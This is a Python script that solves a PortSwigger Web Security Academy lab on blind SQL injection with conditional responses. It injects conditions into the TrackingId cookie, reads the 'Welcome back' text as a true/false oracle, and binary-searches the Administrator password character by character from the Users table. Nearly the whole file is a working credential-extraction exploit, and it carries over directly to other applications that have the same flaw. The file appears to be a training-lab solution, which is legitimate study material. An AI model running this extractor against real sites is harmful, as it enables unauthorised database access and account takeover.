#!/usr/bin/env python3
"""
PortSwigger Web Security Academy lab solver:
Blind SQL injection with conditional responses.

Oracle: "Welcome back" appears in the response body when the injected
condition evaluates to TRUE.

Usage:
  1. Fill in LAB_URL and SESSION_COOKIE below.
  2. pip install requests   (if needed)
  3. python3 blind_sqli_extract.py
"""

import sys
import time

import requests

# ============================================================
# CONFIG -- fill in these two placeholders
# ============================================================
LAB_URL = "https://YOUR-LAB-ID.web-security-academy.net/"  # <-- placeholder
SESSION_COOKIE = "YOUR_SESSION_COOKIE_VALUE"                # <-- placeholder

TRACKING_BASE = "xyz"        # base TrackingId value from your working payload
PASSWORD_LEN = 20            # expected password length
USERNAME = "Administrator"
DELAY = 0.15                 # seconds between requests (avoid lab rate limits)
ORACLE_MARKER = "Welcome back"
# ============================================================

session = requests.Session()
session.cookies.set("session", SESSION_COOKIE)


def oracle(condition: str) -> bool:
    """Return True if the injected SQL condition evaluates to TRUE."""
    payload = f"{TRACKING_BASE}' AND ({condition})-- "
    session.cookies.set("TrackingId", payload)
    resp = session.get(LAB_URL, timeout=10)
    return ORACLE_MARKER in resp.text


def oracle_retry(condition: str, retries: int = 3) -> bool:
    for attempt in range(1, retries + 1):
        try:
            result = oracle(condition)
            time.sleep(DELAY)
            return result
        except requests.RequestException as exc:
            if attempt == retries:
                raise RuntimeError(f"Request failed after {retries} tries: {exc}")
            time.sleep(1.0 * attempt)


def sanity_check() -> None:
    print("[*] Sanity check: TRUE condition (1=1) ... ", end="", flush=True)
    if not oracle_retry("1=1"):
        sys.exit(
            "FAIL - expected 'Welcome back' but did not see it.\n"
            "Check LAB_URL, SESSION_COOKIE, and TRACKING_BASE."
        )
    print("ok (Welcome back seen)")

    print("[*] Sanity check: FALSE condition (1=2) ... ", end="", flush=True)
    if oracle_retry("1=2"):
        sys.exit(
            "FAIL - 'Welcome back' appeared on a FALSE condition.\n"
            "The oracle is not behaving as expected."
        )
    print("ok (no Welcome back)")


def verify_length() -> None:
    print(f"[*] Verifying password length == {PASSWORD_LEN} ... ", end="", flush=True)
    cond = (
        f"SELECT LENGTH((SELECT Password FROM Users "
        f"WHERE Username = '{USERNAME}')) = {PASSWORD_LEN}"
    )
    if oracle_retry(cond):
        print("ok")
    else:
        print(f"WARNING - length is not {PASSWORD_LEN}; continuing anyway")


def char_condition(pos: int, op: str, code: int) -> str:
    return (
        f"SELECT ASCII(SUBSTRING((SELECT Password FROM Users "
        f"WHERE Username = '{USERNAME}'), {pos}, 1)) {op} {code}"
    )


def extract_char(pos: int) -> str:
    """Binary search the ASCII code of the character at `pos`."""
    lo, hi = 32, 126
    while lo < hi:
        mid = (lo + hi) // 2
        if oracle_retry(char_condition(pos, ">", mid)):
            lo = mid + 1
        else:
            hi = mid
    return chr(lo)


def verify_char(pos: int, char: str) -> bool:
    return oracle_retry(char_condition(pos, "=", ord(char)))


def main() -> None:
    print("=" * 60)
    print("Blind SQLi (conditional responses) - password extractor")
    print("=" * 60)

    sanity_check()
    verify_length()

    password = ""
    for pos in range(1, PASSWORD_LEN + 1):
        while True:
            char = extract_char(pos)
            if verify_char(pos, char):
                break
            print(f"\n[!] Position {pos}: verification failed for {char!r}, retrying")
        password += char
        print(f"\r[+] Progress: {password}", end="", flush=True)

    print()
    print("=" * 60)
    print(f"[+] Administrator password: {password}")
    print("=" * 60)
    print("Next: log in as Administrator with this password to solve the lab.")


if __name__ == "__main__":
    main()
